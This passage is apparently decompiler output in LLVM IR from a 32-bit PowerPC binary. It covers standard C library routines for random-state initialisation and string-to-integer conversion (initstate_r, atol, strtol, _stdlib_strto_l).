  %v2_1000b844 = inttoptr i32 %v1_1000b844 to i32*
  %v3_1000b844 = load i32, i32* %v2_1000b844, align 4
  store i32 %v3_1000b844, i32* %r0.global-to-local, align 4
  %v1_1000b848 = mul i32 %v0_1000b848, 10
  store i32 %v1_1000b848, i32* %r31.global-to-local, align 4
  %v2_1000b84c = add i32 %v1_1000b84c, 4
  %v3_1000b84c = inttoptr i32 %v2_1000b84c to i32*
  store i32 %v0_1000b84c, i32* %v3_1000b84c, align 4
  %v0_1000b850 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b850 = mul i32 %v0_1000b850, 4
  %v0_1000b854 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b854 = add i32 %v0_1000b854, %v1_1000b850
  store i32 %v2_1000b854, i32* %r0.global-to-local, align 4
  %v1_1000b858 = load i32, i32* @r30, align 4
  %v2_1000b858 = inttoptr i32 %v1_1000b858 to i32*
  store i32 %v2_1000b854, i32* %v2_1000b858, align 4
  %v2_1000b86c = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000b86421 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b86422 = add i32 %v0_1000b86421, -1
  store i32 %v1_1000b86422, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000b86422, -1
  br i1 %tmp2025, label %dec_label_pc_1000b860, label %dec_label_pc_1000b874

dec_label_pc_1000b860:                            ; preds = %dec_label_pc_1000b844, %dec_label_pc_1000b860
  %v0_1000b86826 = load i32, i32* @r30, align 4
  %v2_1000b860 = inttoptr i32 %v0_1000b86826 to i32*
  %v3_1000b860 = call i32 @__GI_random_r(i32* %v2_1000b860, i32 %v2_1000b86c)
  %v0_1000b864 = load i32, i32* @r31, align 4
  %v1_1000b864 = add i32 %v0_1000b864, -1
  store i32 %v1_1000b864, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000b864, -1
  br i1 %tmp20, label %dec_label_pc_1000b860, label %dec_label_pc_1000b874

dec_label_pc_1000b874:                            ; preds = %dec_label_pc_1000b844, %dec_label_pc_1000b860, %dec_label_pc_1000b7e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b878

dec_label_pc_1000b878:                            ; preds = %entry, %dec_label_pc_1000b874
  %v0_1000b878 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000b874 ]
  store i32 %v0_1000b7ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b878

; uselistorder directives
  uselistorder i32 %v1_1000b840, { 1, 0 }
  uselistorder i32 %v2_1000b83c, { 1, 0 }
  uselistorder i32 %v2_1000b830, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000b81c, { 1, 0 }
  uselistorder i32 %v0_1000b804, { 1, 2, 0 }
  uselistorder i32 %v3_1000b7ec, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000b878, { 1, 0 }
  uselistorder label %dec_label_pc_1000b874, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b860, { 1, 0 }
  uselistorder label %dec_label_pc_1000b844, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b83c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b81c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7e0, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b890 = icmp ugt i32 %arg2, 127
  %v0_1000b898 = load i32, i32* @lr, align 4
  store i32 %v0_1000b898, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v1_1000b8a4 = sub i32 255, %arg2
  %v2_1000b8a4 = sub i32 -1, %arg2
  %not.v5_1000b8a4 = icmp ugt i32 %v1_1000b8a4, %v2_1000b8a4
  %v6_1000b8a8 = sext i1 %not.v5_1000b8a4 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000b8b0 = add i32 %tmp, 4
  store i32 %v1_1000b8b0, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001273c.344 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000b8c8 = sub nsw i32 3, %v6_1000b8a8
  store i32 %v1_1000b8c8, i32* @r31, align 4
  br i1 %v2_1000b890, label %dec_label_pc_1000b8f0, label %dec_label_pc_1000b8d0

dec_label_pc_1000b8d0:                            ; preds = %entry
  %v2_1000b8bc = icmp ugt i32 %arg2, 31
  %v1_1000b8d0 = sub i32 63, %arg2
  %not.v5_1000b8d0 = icmp ugt i32 %v1_1000b8d0, %v2_1000b8a4
  %v6_1000b8d4 = sext i1 %not.v5_1000b8d0 to i32
  %v1_1000b8dc = sub nsw i32 1, %v6_1000b8d4
  store i32 %v1_1000b8dc, i32* @r31, align 4
  br i1 %v2_1000b8bc, label %dec_label_pc_1000b8f0, label %dec_label_pc_1000b8e4

dec_label_pc_1000b8e4:                            ; preds = %dec_label_pc_1000b8d0
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000b950, label %dec_label_pc_1000b8f0

dec_label_pc_1000b8f0:                            ; preds = %dec_label_pc_1000b8e4, %dec_label_pc_1000b8d0, %entry
  %v0_1000b8f0 = phi i32 [ 0, %dec_label_pc_1000b8e4 ], [ %v1_1000b8dc, %dec_label_pc_1000b8d0 ], [ %v1_1000b8c8, %entry ]
  %v1_1000b8f0 = mul nsw i32 %v0_1000b8f0, 4
  store i32 %v1_1000b8f0, i32* %r0.global-to-local, align 4
  %v2_1000b8f4 = add i32 %arg3, 12
  %v3_1000b8f4 = inttoptr i32 %v2_1000b8f4 to i32*
  store i32 %v0_1000b8f0, i32* %v3_1000b8f4, align 4
  %v0_1000b8f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b8f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b8f8 = add i32 %v1_1000b8f8, %v0_1000b8f8
  store i32 %v2_1000b8f8, i32* %r9.global-to-local, align 4
  %v3_1000b8fc = inttoptr i32 %v2_1000b8f8 to i32*
  %v4_1000b8fc = load i32, i32* %v3_1000b8fc, align 4
  store i32 %v4_1000b8fc, i32* %r0.global-to-local, align 4
  %v1_1000b900 = add i32 %v2_1000b8f8, 20
  %v2_1000b900 = inttoptr i32 %v1_1000b900 to i32*
  %v3_1000b900 = load i32, i32* %v2_1000b900, align 4
  store i32 %v3_1000b900, i32* %r9.global-to-local, align 4
  %v1_1000b904 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b904 = add i32 %v1_1000b904, 20
  %v3_1000b904 = inttoptr i32 %v2_1000b904 to i32*
  store i32 %v4_1000b8fc, i32* %v3_1000b904, align 4
  %v0_1000b908 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b908 = mul i32 %v0_1000b908, 4
  store i32 %v1_1000b908, i32* %r0.global-to-local, align 4
  %v0_1000b90c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b90c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b90c = add i32 %v1_1000b90c, 8
  %v3_1000b90c = inttoptr i32 %v2_1000b90c to i32*
  store i32 %v0_1000b90c, i32* %v3_1000b90c, align 4
  %v0_1000b910 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b910 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b910 = add i32 %v1_1000b910, %v0_1000b910
  store i32 %v2_1000b910, i32* %r0.global-to-local, align 4
  %v0_1000b914 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b914 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b914 = add i32 %v1_1000b914, 16
  %v3_1000b914 = inttoptr i32 %v2_1000b914 to i32*
  store i32 %v0_1000b914, i32* %v3_1000b914, align 4
  %v0_1000b918 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b918 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b918 = add i32 %v1_1000b918, 24
  %v3_1000b918 = inttoptr i32 %v2_1000b918 to i32*
  store i32 %v0_1000b918, i32* %v3_1000b918, align 4
  store i32 268482848, i32* @lr, align 4
  %v0_1000b91c = call i32 @srandom_r()
  %v0_1000b920 = load i32, i32* @r31, align 4
  %v3_1000b920 = icmp eq i32 %v0_1000b920, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b92c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000b92c = inttoptr i32 %v1_1000b92c to i32*
  store i32 0, i32* %v2_1000b92c, align 4
  br i1 %v3_1000b920, label %dec_label_pc_1000b964, label %dec_label_pc_1000b934

dec_label_pc_1000b934:                            ; preds = %dec_label_pc_1000b8f0
  %v0_1000b934 = load i32, i32* @r30, align 4
  %v1_1000b934 = add i32 %v0_1000b934, 4
  %v2_1000b934 = inttoptr i32 %v1_1000b934 to i32*
  %v3_1000b934 = load i32, i32* %v2_1000b934, align 4
  %v0_1000b938 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000b938 = sub i32 %v3_1000b934, %v0_1000b938
  %v4_1000b93c = sdiv i32 %v2_1000b938, 4
  %v1_1000b940 = mul i32 %v4_1000b93c, 5
  %v1_1000b944 = load i32, i32* @r31, align 4
  %v2_1000b944 = add i32 %v1_1000b940, %v1_1000b944
  store i32 %v2_1000b944, i32* %r0.global-to-local, align 4
  %v1_1000b948 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000b948 = inttoptr i32 %v1_1000b948 to i32*
  store i32 %v2_1000b944, i32* %v2_1000b948, align 4
  br label %dec_label_pc_1000b964

dec_label_pc_1000b950:                            ; preds = %dec_label_pc_1000b8e4
  %v0_1000b950 = call i32 @__errno_location()
  store i32 %v0_1000b950, i32* %r3.global-to-local, align 4
  %v0_1000b954 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b954 = inttoptr i32 %v0_1000b950 to i32*
  store i32 %v0_1000b954, i32* %v2_1000b954, align 4
  %v0_1000b958 = call i32 @__errno_location()
  %v0_1000b95c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b95c = inttoptr i32 %v0_1000b958 to i32*
  store i32 %v0_1000b95c, i32* %v2_1000b95c, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b8f0, %dec_label_pc_1000b934, %dec_label_pc_1000b950
  store i32 %v0_1000b898, i32* %r0.global-to-local, align 4
  %v0_1000b974 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b974

; uselistorder directives
  uselistorder i32 %v2_1000b8f8, { 1, 0, 2 }
  uselistorder i32 %v0_1000b8f0, { 1, 0 }
  uselistorder i32 %v2_1000b8a4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001273c.344 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000b964, { 2, 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000b980 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000b980
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000b988 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000b988
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000b99c = load i32, i32* @r4, align 4
  store i32 %v0_1000b99c, i32* @r25, align 4
  %v0_1000b9a4 = load i32, i32* @r5, align 4
  store i32 %v0_1000b9a4, i32* %r30.global-to-local, align 4
  %v0_1000b9a8 = load i32, i32* @r6, align 4
  store i32 %v0_1000b9a8, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000b9b0 = load i32, i32* @global_var_100234d8, align 4
  br label %dec_label_pc_1000b9bc

dec_label_pc_1000b9b8:                            ; preds = %dec_label_pc_1000b9bc
  %v1_1000b9b8 = add i32 %v0_1000b9f0, 1
  store i32 %v1_1000b9b8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b9bc

dec_label_pc_1000b9bc:                            ; preds = %entry, %dec_label_pc_1000b9b8
  %v0_1000b9f0 = phi i32 [ %tmp, %entry ], [ %v1_1000b9b8, %dec_label_pc_1000b9b8 ]
  %v1_1000b9bc = inttoptr i32 %v0_1000b9f0 to i8*
  %v2_1000b9bc = load i8, i8* %v1_1000b9bc, align 1
  %v3_1000b9bc = zext i8 %v2_1000b9bc to i32
  %v1_1000b9c0 = mul nuw nsw i32 %v3_1000b9bc, 2
  %v2_1000b9c4 = add i32 %v1_1000b9c0, %v3_1000b9b0
  %v3_1000b9c4 = inttoptr i32 %v2_1000b9c4 to i16*
  %v4_1000b9c4 = load i16, i16* %v3_1000b9c4, align 2
  %v1_1000b9c8 = and i16 %v4_1000b9c4, 32
  %v3_1000b9c8 = icmp eq i16 %v1_1000b9c8, 0
  br i1 %v3_1000b9c8, label %dec_label_pc_1000b9d0, label %dec_label_pc_1000b9b8

dec_label_pc_1000b9d0:                            ; preds = %dec_label_pc_1000b9bc
  %v3_1000b9d0 = icmp eq i8 %v2_1000b9bc, 43
  br i1 %v3_1000b9d0, label %dec_label_pc_1000b9f0, label %dec_label_pc_1000b9d8

dec_label_pc_1000b9d8:                            ; preds = %dec_label_pc_1000b9d0
  %v3_1000b9d8 = icmp eq i8 %v2_1000b9bc, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000b9d8, label %dec_label_pc_1000b9f0, label %dec_label_pc_1000b9f4

dec_label_pc_1000b9f0:                            ; preds = %dec_label_pc_1000b9d0, %dec_label_pc_1000b9d8
  %storemerge = phi i32 [ 1, %dec_label_pc_1000b9d8 ], [ 0, %dec_label_pc_1000b9d0 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000b9f0 = add i32 %v0_1000b9f0, 1
  store i32 %v1_1000b9f0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b9f4

dec_label_pc_1000b9f4:                            ; preds = %dec_label_pc_1000b9d8, %dec_label_pc_1000b9f0
  %v1_1000b9f4 = call i32 @__asm_rlwinm.(i32 %v0_1000b9a4, i32 0, i32 28, i32 26)
  %v4_1000b9f4 = icmp eq i32 %v1_1000b9f4, 0
  br i1 %v4_1000b9f4, label %dec_label_pc_1000ba00, label %dec_label_pc_1000b9f4.dec_label_pc_1000ba3c_crit_edge

dec_label_pc_1000b9f4.dec_label_pc_1000ba3c_crit_edge: ; preds = %dec_label_pc_1000b9f4
  %v0_1000ba3c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ba3c

dec_label_pc_1000ba00:                            ; preds = %dec_label_pc_1000b9f4
  %v0_1000ba00 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ba00 = inttoptr i32 %v0_1000ba00 to i8*
  %v2_1000ba00 = load i8, i8* %v1_1000ba00, align 1
  %v0_1000ba04 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ba04 = add i32 %v0_1000ba04, 10
  store i32 %v1_1000ba04, i32* %r30.global-to-local, align 4
  %v3_1000ba08 = icmp eq i8 %v2_1000ba00, 48
  br i1 %v3_1000ba08, label %dec_label_pc_1000ba10, label %dec_label_pc_1000ba30

dec_label_pc_1000ba10:                            ; preds = %dec_label_pc_1000ba00
  %v1_1000ba10 = add i32 %v0_1000ba00, 1
  %v2_1000ba10 = inttoptr i32 %v1_1000ba10 to i8*
  %v3_1000ba10 = load i8, i8* %v2_1000ba10, align 1
  %v4_1000ba10 = zext i8 %v3_1000ba10 to i32
  store i32 %v1_1000ba10, i32* %r31.global-to-local, align 4
  %v1_1000ba14 = add i32 %v0_1000ba04, 8
  store i32 %v1_1000ba14, i32* %r30.global-to-local, align 4
  %v1_1000ba18 = or i32 %v4_1000ba10, 32
  %v3_1000ba20 = icmp eq i32 %v1_1000ba18, 120
  br i1 %v3_1000ba20, label %dec_label_pc_1000ba28, label %dec_label_pc_1000ba30

dec_label_pc_1000ba28:                            ; preds = %dec_label_pc_1000ba10
  %v1_1000ba28 = mul i32 %v1_1000ba14, 2
  store i32 %v1_1000ba28, i32* %r30.global-to-local, align 4
  %v1_1000ba2c = add i32 %v0_1000ba00, 2
  store i32 %v1_1000ba2c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ba30

dec_label_pc_1000ba30:                            ; preds = %dec_label_pc_1000ba10, %dec_label_pc_1000ba00, %dec_label_pc_1000ba28
  %v0_1000bae415 = phi i32 [ %v1_1000ba10, %dec_label_pc_1000ba28 ], [ %tmp, %dec_label_pc_1000ba00 ], [ %v1_1000ba10, %dec_label_pc_1000ba10 ]
  %v0_1000ba30 = phi i32 [ %v1_1000ba28, %dec_label_pc_1000ba28 ], [ %v1_1000ba04, %dec_label_pc_1000ba00 ], [ %v1_1000ba14, %dec_label_pc_1000ba10 ]
  %tmp22 = icmp slt i32 %v0_1000ba30, 17
  br i1 %tmp22, label %dec_label_pc_1000ba3c, label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba30
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ba3c

dec_label_pc_1000ba3c:                            ; preds = %dec_label_pc_1000b9f4.dec_label_pc_1000ba3c_crit_edge, %dec_label_pc_1000ba30, %dec_label_pc_1000ba38
  %v0_1000bae414 = phi i32 [ %tmp, %dec_label_pc_1000b9f4.dec_label_pc_1000ba3c_crit_edge ], [ %v0_1000bae415, %dec_label_pc_1000ba30 ], [ %v0_1000bae415, %dec_label_pc_1000ba38 ]
  %v1_1000ba50 = phi i32 [ %v0_1000ba3c.pre, %dec_label_pc_1000b9f4.dec_label_pc_1000ba3c_crit_edge ], [ %v0_1000ba30, %dec_label_pc_1000ba30 ], [ 16, %dec_label_pc_1000ba38 ]
  %v1_1000ba3c = add i32 %v1_1000ba50, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000ba44 = icmp ugt i32 %v1_1000ba3c, 34
  br i1 %v2_1000ba44, label %dec_label_pc_1000badc, label %dec_label_pc_1000ba4c

dec_label_pc_1000ba4c:                            ; preds = %dec_label_pc_1000ba3c
  %v2_1000ba50 = udiv i32 -1, %v1_1000ba50
  store i32 %v2_1000ba50, i32* @r29, align 4
  %v2_1000ba54 = mul i32 %v2_1000ba50, %v1_1000ba50
  %v1_1000ba58 = sub i32 -1, %v2_1000ba54
  %v1_1000ba5c = urem i32 %v1_1000ba58, 256
  store i32 %v1_1000ba5c, i32* @r27, align 4
  %v0_1000ba68.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ba68

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000bad0, %dec_label_pc_1000bab8
  %v1_1000ba6c.pre = phi i32 [ %v1_1000ba70, %dec_label_pc_1000bad0 ], [ %v1_1000ba6c.pre.pre, %dec_label_pc_1000bab8 ]
  %v0_1000ba6c.pre = phi i32 [ %v2_1000bad4, %dec_label_pc_1000bad0 ], [ %v0_1000ba6c.pre.pre, %dec_label_pc_1000bab8 ]
  %v0_1000ba64 = phi i32 [ %v1_1000ba74, %dec_label_pc_1000bad0 ], [ %v0_1000ba64.pre, %dec_label_pc_1000bab8 ]
  br label %dec_label_pc_1000ba68

dec_label_pc_1000ba68:                            ; preds = %dec_label_pc_1000ba4c, %dec_label_pc_1000ba64
  %v0_1000bae412 = phi i32 [ %v0_1000bae414, %dec_label_pc_1000ba4c ], [ %v0_1000ba64, %dec_label_pc_1000ba64 ]
  %v0_1000ba74 = phi i32 [ %v0_1000ba68.pre, %dec_label_pc_1000ba4c ], [ %v0_1000ba64, %dec_label_pc_1000ba64 ]
  %v1_1000ba70 = phi i32 [ %v2_1000ba50, %dec_label_pc_1000ba4c ], [ %v1_1000ba6c.pre, %dec_label_pc_1000ba64 ]
  %v0_1000bad0 = phi i32 [ 0, %dec_label_pc_1000ba4c ], [ %v0_1000ba6c.pre, %dec_label_pc_1000ba64 ]
  %v1_1000ba68 = inttoptr i32 %v0_1000ba74 to i8*
  %v2_1000ba68 = load i8, i8* %v1_1000ba68, align 1
  %v3_1000ba68 = zext i8 %v2_1000ba68 to i32
  %v3_1000ba6c = icmp ugt i32 %v0_1000bad0, %v1_1000ba70
  %v1_1000ba74 = add i32 %v0_1000ba74, 1
  store i32 %v1_1000ba74, i32* %r31.global-to-local, align 4
  %v1_1000ba78 = add nsw i32 %v3_1000ba68, -48
  %v1_1000ba7c = or i32 %v3_1000ba68, 32
  %v1_1000ba80 = urem i32 %v1_1000ba78, 256
  %tmp23 = icmp ult i32 %v1_1000ba80, 10
  br i1 %tmp23, label %dec_label_pc_1000baa0, label %dec_label_pc_1000ba90

dec_label_pc_1000ba90:                            ; preds = %dec_label_pc_1000ba68
  %tmp24 = icmp ult i32 %v1_1000ba7c, 97
  br i1 %tmp24, label %dec_label_pc_1000baa0, label %dec_label_pc_1000ba9c

dec_label_pc_1000ba9c:                            ; preds = %dec_label_pc_1000ba90
  %v1_1000ba90 = add nsw i32 %v1_1000ba7c, -87
  %v1_1000ba9c = urem i32 %v1_1000ba90, 256
  br label %dec_label_pc_1000baa0

dec_label_pc_1000baa0:                            ; preds = %dec_label_pc_1000ba90, %dec_label_pc_1000ba68, %dec_label_pc_1000ba9c
  %v1_1000bad4 = phi i32 [ 40, %dec_label_pc_1000ba90 ], [ %v1_1000ba80, %dec_label_pc_1000ba68 ], [ %v1_1000ba9c, %dec_label_pc_1000ba9c ]
  %v1_1000baa0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000baa0 = icmp slt i32 %v1_1000bad4, %v1_1000baa0
  br i1 %v2_1000baa0, label %dec_label_pc_1000baa8, label %dec_label_pc_1000badc

dec_label_pc_1000baa8:                            ; preds = %dec_label_pc_1000baa0
  br i1 %v3_1000ba6c, label %dec_label_pc_1000bab8, label %dec_label_pc_1000baac

dec_label_pc_1000baac:                            ; preds = %dec_label_pc_1000baa8
  %v1_1000baac = load i32, i32* @r27, align 4
  %v0_1000bab0.not = icmp ne i32 %v0_1000bad0, %v1_1000ba70
  %tmp25 = icmp ule i32 %v1_1000bad4, %v1_1000baac
  %or.cond = or i1 %tmp25, %v0_1000bab0.not
  br i1 %or.cond, label %dec_label_pc_1000bad0, label %dec_label_pc_1000bab8

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000baac, %dec_label_pc_1000baa8
  %v0_1000bab8 = call i32 @__errno_location()
  %v0_1000babc = load i32, i32* @r28, align 4
  %v1_1000babc = load i32, i32* @r26, align 4
  %v2_1000babc = and i32 %v1_1000babc, %v0_1000babc
  store i32 %v2_1000babc, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000bac8 = inttoptr i32 %v0_1000bab8 to i32*
  store i32 34, i32* %v2_1000bac8, align 4
  %v0_1000ba64.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000ba6c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ba6c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ba64

dec_label_pc_1000bad0:                            ; preds = %dec_label_pc_1000baac
  %v2_1000bad0 = mul i32 %v1_1000baa0, %v0_1000bad0
  %v2_1000bad4 = add i32 %v2_1000bad0, %v1_1000bad4
  store i32 %v2_1000bad4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ba64

dec_label_pc_1000badc:                            ; preds = %dec_label_pc_1000baa0, %dec_label_pc_1000ba3c
  %v0_1000bae4 = phi i32 [ %v0_1000bae414, %dec_label_pc_1000ba3c ], [ %v0_1000bae412, %dec_label_pc_1000baa0 ]
  %v0_1000badc = load i32, i32* @r25, align 4
  %v3_1000badc = icmp eq i32 %v0_1000badc, 0
  br i1 %v3_1000badc, label %dec_label_pc_1000bae8, label %dec_label_pc_1000bae4

dec_label_pc_1000bae4:                            ; preds = %dec_label_pc_1000badc
  %v2_1000bae4 = inttoptr i32 %v0_1000badc to i32*
  store i32 %v0_1000bae4, i32* %v2_1000bae4, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000badc, %dec_label_pc_1000bae4
  %v0_1000bae8 = load i32, i32* @r26, align 4
  %v3_1000bae8 = icmp eq i32 %v0_1000bae8, 0
  %v0_1000baec = load i32, i32* @r28, align 4
  %v1_1000baec = sub i32 0, %v0_1000baec
  %tmp27 = lshr i32 %v1_1000baec, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000bb2c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000bae8, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb04

dec_label_pc_1000bb04:                            ; preds = %dec_label_pc_1000bae8
  %v3_1000bb04 = icmp ugt i32 %v0_1000bb2c.pre.pre, %tmp28
  br i1 %v3_1000bb04, label %dec_label_pc_1000bb0c, label %dec_label_pc_1000bb1c

dec_label_pc_1000bb0c:                            ; preds = %dec_label_pc_1000bb04
  %v0_1000bb0c = call i32 @__errno_location()
  %v2_1000bb14 = inttoptr i32 %v0_1000bb0c to i32*
  store i32 34, i32* %v2_1000bb14, align 4
  %v0_1000bb18 = load i32, i32* @r31, align 4
  store i32 %v0_1000bb18, i32* %r8.global-to-local, align 4
  %v0_1000bb1c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000bb1c

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000bae8, %dec_label_pc_1000bb04, %dec_label_pc_1000bb0c
  %v0_1000bb2c.pre = phi i32 [ %v0_1000bb2c.pre.pre, %dec_label_pc_1000bb04 ], [ %v0_1000bb18, %dec_label_pc_1000bb0c ], [ %v0_1000bb2c.pre.pre, %dec_label_pc_1000bae8 ]
  %v0_1000bb1c = phi i32 [ %v0_1000baec, %dec_label_pc_1000bb04 ], [ %v0_1000bb1c.pre, %dec_label_pc_1000bb0c ], [ %v0_1000baec, %dec_label_pc_1000bae8 ]
  %v3_1000bb1c = icmp eq i32 %v0_1000bb1c, 0
  br i1 %v3_1000bb1c, label %dec_label_pc_1000bb28, label %dec_label_pc_1000bb24

dec_label_pc_1000bb24:                            ; preds = %dec_label_pc_1000bb1c
  %v1_1000bb24 = sub i32 0, %v0_1000bb2c.pre
  store i32 %v1_1000bb24, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bb28

dec_label_pc_1000bb28:                            ; preds = %dec_label_pc_1000bb1c, %dec_label_pc_1000bb24
  %v0_1000bb2c = phi i32 [ %v1_1000bb24, %dec_label_pc_1000bb24 ], [ %v0_1000bb2c.pre, %dec_label_pc_1000bb1c ]
  ret i32 %v0_1000bb2c

; uselistorder directives
  uselistorder i32 %v0_1000bb2c.pre, { 1, 0 }
  uselistorder i32 %v0_1000bb2c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000bad4, { 1, 0 }
  uselistorder i32 %v1_1000ba80, { 1, 0 }
  uselistorder i32 %v1_1000ba7c, { 1, 0 }
  uselistorder i32 %v1_1000ba74, { 1, 0 }
  uselistorder i32 %v3_1000ba68, { 1, 0 }
  uselistorder i32 %v0_1000bad0, { 1, 0, 2 }
  uselistorder i32 %v1_1000ba70, { 0, 2, 1 }
  uselistorder i32 %v0_1000ba64, { 1, 0 }
  uselistorder i32 %v2_1000ba50, { 1, 0, 2 }
  uselistorder i32 %v1_1000ba28, { 1, 0 }
  uselistorder i32 %v1_1000ba14, { 1, 0, 2 }
  uselistorder i32 %v0_1000b9f0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000bb28, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bae8, { 1, 0 }
  uselistorder label %dec_label_pc_1000baa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ba68, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ba30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b9f4, { 1, 0 }
